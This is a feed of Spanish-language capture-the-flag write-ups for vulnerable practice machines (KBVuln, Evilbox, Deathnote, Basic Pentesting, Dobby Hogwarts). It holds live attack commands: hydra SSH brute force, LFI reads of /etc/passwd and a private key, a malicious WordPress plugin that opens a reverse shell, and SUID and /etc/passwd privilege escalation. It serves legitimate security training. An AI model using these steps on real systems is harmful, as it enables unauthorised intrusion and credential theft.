get backup.zip
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/13.png){: .align-center}

Moverlo a un nuevo directorio y descomprimirlo

```bash
mkdir kbvuln2
mv backup.zip kbvuln2/
ls
unzip backup.zip
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/14.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/15.png){: .align-center}

Creará un directorio llamado wordpress y un archivo llamado `remember_me.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/16.png){: .align-center}

Leer el archivo remember_me.txt, mostrará un usuario y contraseña

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/17.png){: .align-center}

Ir al login de la web de wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/18.png){: .align-center}

Copiar la direccion DNS del action del formulario.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/19.png){: .align-center}

Añadir el dominio dns al archivo `/etc/hosts`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/20.png){: .align-center}

Recargar el sitio, ahora se verá correctamente

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/21.png){: .align-center}

Colocar el usuario y contraseña y dar en Log In

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/22.png){: .align-center}

Ir al editor de temas de wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/23.png){: .align-center}

Editar el archivo 404 con un script de reverse_php

Preparar un plugin que hará un shell inverso

```bash
cd ~/Downloads/repos

git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git

cd malicious-wordpress-plugin

Python wordpwn.py 192.168.122.5 4444 Y
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/24.png){: .align-center}

Se pondrá de forma automática en escucha

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/25.png){: .align-center}

Y se creará un archivo zip

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/26.png){: .align-center}

Subir el plugin al sitio de wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/27.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/28.png){: .align-center}

Activar el plugin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/29.png){: .align-center}

Ir al editor de plugins y seleccionar GotEm

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/30.png){: .align-center}

Ir a la ruta del plugin
`http://192.168.122.6/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/31.png){: .align-center}

Se abrirá un shell inverso con meterpreter

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/32.png){: .align-center}

Cambiar a shell y ver el usuario  

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/33.png){: .align-center}

Ir al directorio home del usuario kbadmin y mostrar el contenido, luego leer el archivo `user.txt`

Dará la flag del usuario

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/34.png){: .align-center}

Ir a /var/www/html y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/35.png){: .align-center}

Leer el contenido de read_ME.txt

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/36.png){: .align-center}

Leer el contenido del archivo remember_me.txt

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/37.png){: .align-center}

Tratar de acceder por ssh al usuario kbadmin con esa contraseña

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/38.png){: .align-center}

Ver los permisos del usuario kbadmin usando el comando `sudo –l`, mostrará que tiene todos los permisos por lo que puede cambiar al usuario root sin necesidad de introducir contraseña.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/39.png){: .align-center}

Cambiar al usuario root

```bash
sudo su
```
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/40.png){: .align-center}

Ir al directorio de root y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/41.png){: .align-center}

Mostrar el contenido de flag.txt

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/42.png){: .align-center}

## Flags

Usuario: 03bf4d20dac5644c75e69e40bad48db0

Root: dc387b4cf1a4143f562dd1bdb3790ff1]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 2.]]></summary></entry><entry><title type="html">KBVuln 1</title><link href="http://localhost:4000/vulnhub/kbvuln1/" rel="alternate" type="text/html" title="KBVuln 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln1</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln1/"><![CDATA[[https://www.vulnhub.com/entry/kb-vuln-1,540/](https://www.vulnhub.com/entry/kb-vuln-1,540/)

```bash
sudo nmap -vvv -sS -sV -O 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/1.png){: .align-center}

Saldrá una máquina con varios puertos abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/2.png){: .align-center}

Entrar al servidor web desde el navegador, aparecerá una web normal

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/3.png){: .align-center}

Analizar directorios ocultos con gobuster
```bash
gobuster dir –u 192.168.122.4 -w /usr/share/dirb/wordlists/common.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/4.png){: .align-center}

No aparece nada fuera de lo normal.

Tratar de entrar en el servidor FTP de forma anónima
```bash
ftp 192.168.122.4
```

Usuario: Anonymous

Contraseña: Vacía

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/5.png){: .align-center}

Mostrar el contenido y descargar el único archivo que se encuentra en el directorio

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/6.png){: .align-center}

No se encuentra nada útil

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/7.png){: .align-center}

Ver código fuente del sitio web, saldrá un usuario llamado sysadmin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/8.png){: .align-center}

Usar hydra para hacer fuerza bruta al ssh de la máquina con el usuario sysadmin

```bash
sudo hydra -l sysadmin –P /usr/share/wordlists/rockyou.txt 192.168.122.4 ssh
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/9.png){: .align-center}

Entar por ssh a la máquina usando el usuario sysadmin y la contraseña obtenida con hydra

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/10.png){: .align-center}

Mostrar el contenido y leer el archivo user.txt, mostrará el flag del usuario

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/11.png){: .align-center}

Ir al directorio ftp y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/12.png){: .align-center}

Leer el archivo .bash_history

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/13.png){: .align-center}

Ir al directorio /etc/update-motd.d/ y mostrar todo el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/14.png){: .align-center}

Saldrá un archivo con todos los permisos, este controla el mensaje que aparece cada vez que se inicia una sesión por SSH

Editar el archivo /etc/update.motd.d/00-header y añadir al final:

sudo chmod u+s /usr/bin/find

Esto permitirá usar un comando que cambiará el usuario a root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/15.png){: .align-center}

Usar el comando para obtener acceso root:
find . -exec /bin/bash -p \; -quit

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/16.png){: .align-center}

Ir al directorio de root y leer el flag

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln1/17.png){: .align-center}

## Flags

Usuario: 48a365b4ce1e322a55ae9017f3daf0c0

Root: 1eedddf9fff436e6648b5e51cb0d2ec7]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 1.]]></summary></entry><entry><title type="html">Evilbox</title><link href="http://localhost:4000/vulnhub/evilbox/" rel="alternate" type="text/html" title="Evilbox" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/evilbox</id><content type="html" xml:base="http://localhost:4000/vulnhub/evilbox/"><![CDATA[[https://www.vulnhub.com/entry/evilbox-one,736/](https://www.vulnhub.com/entry/evilbox-one,736/)


```bash
sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/1.png){: .align-center}

Saldrá una IP con los puertos 80 y 22 abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/2.png){: .align-center}

Al entrar en la web aparecerá la página por defecto de Apache y no se mostrará nada en el código fuente

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/3.png){: .align-center}

Escanear todos los directorios ocultos

```bash
sudo gobuster dir –u 192.168.122.14 -w /usr/share/wordlists/dirb/big.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/4.png){: .align-center}

Mostrará el archivo `robots.txt` y un directorio llamado `secret`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/5.png){: .align-center}

Ir a robots.txt, no mostrará nada relevante
`192.168.122.14/robots.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/6.png){: .align-center}

Ir a secret, no mostrará contenido, sin embargo tampoco mostrará mensaje de error
`192.168.122.14/secret`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/7.png){: .align-center}

Realizar escaneo de directorios bajo el directorio secret y listando todo lo que termine en html, php o txt

```bash
sudo gobuster dir –u 192.168.122.14/secret  -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/8.png){: .align-center}

Aparecerá un nuevo archivo llamado `evil.php`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/9.png){: .align-center}

Al ir de nuevo no mostrará nada, ni si quiera mensaje de error

`192.168.122.14/secret/evil.php`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/10.png){: .align-center}

Tratar de fuzzear para intentar ejecutar comandos y de este modo leer el contenido de `/etc/passwd`

```bash
wfuzz -u "http://192.168.122.14/secret/evil.php?FUZZ=../../../../../../etc/passwd"  -w /usr/share/wordlists/fuzz-lfi-params-list.txt -hw 0
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/11.png){: .align-center}

Aparecerá como resultado que puede usarse command

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/12.png){: .align-center}

Ir a la url añadiendo `?command=../../../../../../etc/passwd`

`192.168.122.14/secret/evil.php?command=../../../../../../etc/passwd`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/13.png){: .align-center}

Inspeccionar el código fuente para que se muestre de forma ordenada

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/14.png){: .align-center}

Al observar el archivo `/etc/passwd` podrá verse un usuario llamado mowree

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/15.png){: .align-center}

Ir a `/home/mowree/.ssh/id_rsa` para buscar la clave privada del usuario

http://192.168.122.14/secret/evil.php?FUZZ=/home/mowree/.ssh/id_rsa

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/16.png){: .align-center}

Copiar la clave privada y guardarla en el equipo atacante

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/17.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/18.png){: .align-center}

Convertirlo a hash con la herramienta ssh2john.py y guardarlo en otro archivo nuevo

```bash
/usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/19.png){: .align-center}

Crackear la contraseña con john

```bash
john id_rsa_hash.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/20.png){: .align-center}

Mostrará la contraseña como resultado

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/21.png){: .align-center}

Entrar por ssh con el usuario mowree y la contraseña encontrada

```bash
ssh mowree@192.168.122.14 -i id_rsa
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/22.png){: .align-center}

Mostrar el contenido del directorio home del usuario mowree y leer el archivo `user.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/23.png){: .align-center}

Al mostrar los permisos de `/etc/passwd` podrá verse que tiene permiso de escritura para todos los usuarios

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/24.png){: .align-center}

Crear una nuevo usuario con una clave creada en  formato sha-512 desde la maquina atacante

```bash
mkpasswd -m sha-512
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/25.png){: .align-center}

Guardarla en un archivo y crear una linea como si de un usuario se tratase, dando permisos de root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/26.png){: .align-center}

Copiar este nuevo usuario y ponerlo en el `/etc/passwd` de la máquina victima  

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/27.png){: .align-center}

Cambiar al usuario nuevo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/28.png){: .align-center}

Ir a `/root` y mostrar el contenido de root.txt

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/29.png){: .align-center}

## Flags

User: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ

Root: 36QtXfdJWvdC0VavlPIApUbDlqTsBM]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Evilbox.]]></summary></entry><entry><title type="html">Deathnote</title><link href="http://localhost:4000/vulnhub/deathnote/" rel="alternate" type="text/html" title="Deathnote" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/deathnote</id><content type="html" xml:base="http://localhost:4000/vulnhub/deathnote/"><![CDATA[[https://www.vulnhub.com/entry/deathnote-1,739/](https://www.vulnhub.com/entry/deathnote-1,739/)


```bash
sudo nmap -vvv -sS -sV -O 192.168.1.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/1.png){: .align-center}

Saldrá una IP con los puertos 80 y 22 abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/2.png){: .align-center}

Al intentar entrar a la web saldrá un mensaje que dice Please wait y se redireccionará a una web de wordpress.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/3.png){: .align-center}

Realizar un escaneo de todos los directorios del sitio con gobuster

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/4.png){: .align-center}

Ir a `/robots.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/5.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/6.png){: .align-center}

Ir a `/important.jpg`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/7.png){: .align-center}

Dirá que la imagen no se puede cargar por contener errores así que procedemos a descargar ese archivo a nuestro equipo usando `wget`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/8.png){: .align-center}

Comprobar que el archivo es realmente una imagen en jpg

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/9.png){: .align-center}

Dirá que realmente es un documento de texto al que se le ha cambiado el nombre para hacer parecer que es una imagen.

Leer el archivo `important.jpg`, no es necesario cambiar su extensión para que cat lo reconozca.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/10.png){: .align-center}

Dirá que miremos en `/user.txt`, tambien que la contraseña puede estar en el lugar de la pista

Entrar a la web y darle click al Hint

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/11.png){: .align-center}

Dirá que busquemos un archivo llamado `notes.txt` en el servidor o leamos el comentario de L

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/12.png){: .align-center}

Mirar el comentario de L

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/13.png){: .align-center}

Probar a acceder desde el login con el usuario Kira y la contraseña iamjustic3

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/14.png){: .align-center}

Dará acceso al panel de administrador de Wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/15.png){: .align-center}

Probar a entrar al editor de temas para modificar el de 404, mostrará que no es posible

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/16.png){: .align-center}

Utilizar `malicious-wordpress-plugin` para crear un plugin que abrirá un shell inverso

```bash
python wordpwn.py 192.168.122.5 4444 Y
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/17.png){: .align-center}

Quedará en el puerto de escucha y se generará un archivo zip que será el plugin

Subir el plugin al sitio de wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/18.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/19.png){: .align-center}

Activar el plugin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/20.png){: .align-center}

Ir al editor de plugins y seleccionar GotEm

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/21.png){: .align-center}

Ir a la ruta del plugin

http://192.168.122.7/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php

Se abrirá un shell inverso con meterpreter

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/22.png){: .align-center}

Entrar en modo shell con el comando `shell`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/21.png){: .align-center}

Comprobar que el usuario es `www-data`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/22.png){: .align-center}

Ir al directorio home y mostrar contenido para ver los usuarios, se mostraran el usuario kira y el usuario l

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/23.png){: .align-center}

Entrar en el directorio de kira, mostrar el contenido e intentar leer el archivo `kira.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/24.png){: .align-center}

Volver atrás e intentar lo mismo en el directorio de `l`, mostrar el contenido de `user.txt`, mostrará un texto cifrado en Brainfuck

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/25.png){: .align-center}

Descifrar el mensaje usando la web de dcode.fr, mostrará el mensaje "i think u got the shell, but you wont be able to kill me -kira"

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/26.png){: .align-center}

Volver al panel de wordpress e investigar más, en la sección de media se encontrará el archivo `notes.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/27.png){: .align-center}

Parece ser un diccionario de posibles claves, descargarlo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/28.png){: .align-center}

Usar `hydra` para encontrar cuál de las contraseñas es del usuario L en `ssh`

```bash
sudo hydra -t 4 -l l -P Downloads/notes.txt 192.168.122.7 ssh
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/29.png){: .align-center}

Usuario: l
Contraseña: death4me

Entrar por `ssh` con el usuario l y la contraseña death4me

Ir al directorio `/opt` y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/30.png){: .align-center}

Ir al directorio y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/31.png){: .align-center}

Ir al directorio `fake-notebook-rule/` y mostrar el contenido, el archivo `hint` dirá que se use cyberchef aunque no es necesario

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/32.png){: .align-center}

Comprobar el tipo de archivo de `case.wav`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/33.png){: .align-center}

Leer el archivo `case.wav`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/34.png){: .align-center}

Usar dcode.fr para descifrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/35.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/36.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/37.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/38.png){: .align-center}

Ir al directorio `kira-case/`, el archivo case-file.txt no mostrará nada relevante

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/39.png){: .align-center}

Cambiar al usuario kira con la contraseña del mensaje cifrado anterior

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/40.png){: .align-center}

Mostrar que permisos tiene el usuario con el comando

```bash
sudo -l
```

Mostrará que puede ejecutar todo, esto significa que puede cambiar a usuario root sin necesidad de introducir contraseña

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/41.png){: .align-center}

Cambiar al usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/42.png){: .align-center}

Ir al directorio de root y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/43.png){: .align-center}

Leer el contenido de `root.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/44.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Deathnote.]]></summary></entry><entry><title type="html">Basic Pentesting</title><link href="http://localhost:4000/tryhackme/basic-pentesting/" rel="alternate" type="text/html" title="Basic Pentesting" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/tryhackme/basic-pentesting</id><content type="html" xml:base="http://localhost:4000/tryhackme/basic-pentesting/"><![CDATA[# Preguntas

**What does the acronym VM stand for?**

virtual machine

**What is the name of the hidden directory on the web server(enter name without /)?**

Development

**What is the username?**

Jan

**What is the password?**

armando

**What service do you use to access the server(answer in abbreviation in all caps)?**

SSH

**What is the name of the other user you found(all lower case)?**

Kay

**What is the final password you obtain?**

heresareallystrongpasswordthatfollowsthepasswordpolicy$$


# Proceso

Listar todos los directorios ocultos de la web

```bash
sudo gobuster dir -u 10.10.35.80 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/1.png){: .align-center}

Listar los usuarios del sistema

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/2.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/3.png){: .align-center}

Listar los recursos compartidos por SMB

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/4.png){: .align-center}

Entrar al recurso compartido de Anonymous y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/5.png){: .align-center}

Usar `hydra` para encontrar la contraseña de jay

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/6.png){: .align-center}

Entrar por ssh con el usuario jay y la contraseña descubierta

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/7.png){: .align-center}

Ir al directorio home, luego al directorio personal de kay y al directorio `.ssh`, dentro se encontrará la clave privada del usuario

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/8.png){: .align-center}

Leer el archivo de la clave privada `id_rsa` y copiar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/9.png){: .align-center}

Guardar el contenido en un archivo del equipo atacante

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/10.png){: .align-center}

Convertirlo a hash con la herramienta `ssh2john.py` y guardarlo en otro archivo nuevo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/11.png){: .align-center}

Crackear la contraseña con `john`, servirán tanto rockyou como dark0de

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/12.png){: .align-center}

Entrar por ssh usando la clave privada e introduciendo la contraseña crackeada

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/13.png){: .align-center}

Ir al directorio personal de Kay y leer el archivo `pass.bak`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/14.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="tryhackme" /><category term="tryhackme" /><category term="writeup" /><summary type="html"><![CDATA[[Academy][TryHackMe] Writeup de Basic Pentesting.]]></summary></entry><entry><title type="html">Dobby hogwarts</title><link href="http://localhost:4000/vulnhub/dobby-hogwarts/" rel="alternate" type="text/html" title="Dobby hogwarts" /><published>2022-07-31T00:00:00+02:00</published><updated>2022-07-31T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/dobby-hogwarts</id><content type="html" xml:base="http://localhost:4000/vulnhub/dobby-hogwarts/"><![CDATA[[https://www.vulnhub.com/entry/hogwarts-dobby,597/](https://www.vulnhub.com/entry/hogwarts-dobby,597/)

```bash
sudo nmap -vvv -sS -sV -O 192.168.1.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/1.png){: .align-center}

Saldrá una IP con el puerto 80 abierto

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/2.png){: .align-center}

Abrir navegador e ir a la IP, en este caso

```bash
192.168.1.82
```

Se abrirá una web por defecto de apache

Hacemos click derecho e inspeccionar elemento

Abajo del todo veremos una pista que nos dice que miremos en /alohomora así que ponemos

```bash
192.168.122.23/alohomora
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/3.png){: .align-center}


Nos dirá que la clave de Draco es su casa (slytherin)

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/4.png){: .align-center}

Ahora hacemos un gobuster para ver qué más directorios existen

```bash
gobuster  dir -u 192.168.122.23 -P 80 -w /usr/share/dirb/wordlists/common.txt
```

Nos saldrán más directorios, entre ellos uno llamado log

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/5.png){: .align-center}

Accedemos a el así
```bash
192.168.122.23/log
```

Nos dará una contraseña y nos dirá que miremos en /DiagonAlley

La contraseña está cifrada en base64, la desciframos y saldrá algo así

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/6.png){: .align-center}

```bash
::ilikesocks
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/7.png){: .align-center}

Vamos a DiagonAlley así
```bash
192.168.122.23/DiagonAlley
```

Veremos una web con dos artículos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/8.png){: .align-center}

El primer artículo tendrá un código cifrado, lo podemos descifrar en decode.fr/cipher-identifier

Ahora hacemos de nuevo un gobuster pero bajo ese directorio

```bash
gobuster  dir -u 192.168.122.23/DiagonAlley
```

Nos mostrará que hay varios directorios y archivos de wordpress, entre ellos uno llamado wp-admin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/9.png){: .align-center}

Accedemos a él así
```bash
192.168.122.23/DiagonAlley/wp-admin
```

Nos saldrá una página de inicio de sesión

Colocamos de nombre Draco y de contraseña slytherin

